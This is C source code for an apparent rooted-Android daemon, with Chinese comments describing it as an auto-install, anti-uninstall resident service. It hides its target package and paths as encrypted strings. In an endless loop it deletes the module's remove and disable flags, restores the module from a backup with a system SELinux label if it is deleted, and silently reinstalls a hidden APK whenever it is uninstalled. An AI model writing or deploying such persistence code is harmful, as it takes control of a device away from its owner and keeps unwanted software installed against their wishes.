#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

// 引入自动生成的加密文件
#include "encrypted_secrets.h"

// 运行时解密后的局部内存指针
char *pkg, *mod_path, *apk_path, *bk_path, *log_file;

void log_msg(const char* text) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "echo \"[$(date)] %s\" >> %s", text, log_file);
    system(cmd);
}

void install_target_apk() {
    if (access(apk_path, F_OK) != 0) {
        char err_msg[256];
        snprintf(err_msg, sizeof(err_msg), "错误：未找到APK文件 %s", apk_path);
        log_msg(err_msg);
        return;
    }

    char check_cmd[256];
    snprintf(check_cmd, sizeof(check_cmd), "pm list packages | grep -q '%s'", pkg);
    
    if (system(check_cmd) != 0) {
        log_msg("检测到应用未安装，正在自动安装...");
        char ins_cmd[512];
        snprintf(ins_cmd, sizeof(ins_cmd), "pm install -r --user 0 %s >> %s 2>&1", apk_path, log_file);
        
        if (system(ins_cmd) == 0) {
            log_msg("APK 安装成功");
        } else {
            log_msg("APK 安装失败，稍后重试");
        }
    }
}

int main() {
    // 1. 运行时无痕解密（一生仅解密一次，防止死循环异或破坏明文）
    decrypt_str(enc_target_package, sizeof(enc_target_package));
    decrypt_str(enc_modpath, sizeof(enc_modpath));
    decrypt_str(enc_apk_path, sizeof(enc_apk_path));
    decrypt_str(enc_backup_path, sizeof(enc_backup_path));
    decrypt_str(enc_logfile, sizeof(enc_logfile));

    pkg = (char*)enc_target_package;
    mod_path = (char*)enc_modpath;
    apk_path = (char*)enc_apk_path;
    bk_path = (char*)enc_backup_path;
    log_file = (char*)enc_logfile;

    // 2. 等待开机完成
    while (1) {
        if (system("[ \"$(getprop sys.boot_completed)\" = \"1\" ]") == 0) {
            break;
        }
        sleep(1);
    }
    sleep(10);

    log_msg("自动安装+防卸载常驻守护服务已启动");

    // 3. 首次运行如果备份不在，则建立备份
    struct stat st;
    if (stat(bk_path, &st) != 0) {
        char init_cmd[512];
        snprintf(init_cmd, sizeof(init_cmd), "mkdir -p %s && cp -af %s/* %s/", bk_path, mod_path, bk_path);
        system(init_cmd);
    }

    // 4. 首次启动先检测一次 APK
    install_target_apk();

    // 5. 常驻死循环守护
    char cmd_buf[512];
    while (1) {
        // 强制清除卸载和禁用标记
        snprintf(cmd_buf, sizeof(cmd_buf), "rm -f %s/remove %s/disable 2>/dev/null", mod_path, mod_path);
        system(cmd_buf);
        
        // 如果模块目录丢失，强制从备份复活
        if (stat(mod_path, &st) != 0) {
            snprintf(cmd_buf, sizeof(cmd_buf), "cp -af %s %s && chcon -R u:object_r:system_file:s0 %s 2>/dev/null", bk_path, mod_path, mod_path);
            system(cmd_buf);
            log_msg("模块已被删除，已强行从备份复活");
        }

        // APK 保活检查
        install_target_apk();

        sleep(2);
    }

    return 0;
}
